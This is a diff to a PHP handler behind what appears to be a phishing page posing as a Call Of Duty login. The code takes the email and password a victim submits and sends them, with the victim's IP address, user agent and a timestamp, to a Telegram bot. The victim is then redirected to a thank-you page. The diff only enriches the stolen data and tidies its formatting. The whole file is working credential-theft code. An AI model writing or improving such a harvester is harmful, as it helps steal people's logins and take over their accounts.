@@ -11,20 +11,31 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $name = htmlspecialchars($_POST["username"] ?? '');
     $message = htmlspecialchars($_POST["password"] ?? '');
 
-    // Get IP address
-    $ip = $_SERVER['REMOTE_ADDR'];
+    // Get visitor IP
+    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
+          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
+          $_SERVER['REMOTE_ADDR'];
+
+    // Get user agent
+    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+
+    // Get current time
+    $time = date("Y-m-d H:i:s");
 
     // Format Telegram message
-    $text = "📥 New Call Of Duty Login:\n\n";
-    $text .= "👤 Email: $name\n";
-    $text .= "📝 Password: $message\n";
-    $text .= "🌐 IP Address: $ip";
+    $text = "📥 *New Call Of Duty Login:*\n\n";
+    $text .= "👤 *Email:* `$name`\n";
+    $text .= "🔐 *Password:* `$message`\n";
+    $text .= "🌐 *IP Address:* `$ip`\n";
+    $text .= "📱 *User-Agent:* `$userAgent`\n";
+    $text .= "🕒 *Time:* $time";
 
     // Send message to Telegram
     $url = "https://api.telegram.org/bot$botToken/sendMessage";
     $payload = [
         'chat_id' => $chatId,
-        'text' => $text
+        'text' => $text,
+        'parse_mode' => 'Markdown'
     ];
 
     $ch = curl_init($url);
@@ -45,6 +56,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     // Redirect or show success message
     header("Location: thank-you.html");
     exit;
+
 } else {
     // If accessed directly
     echo "Access denied.";
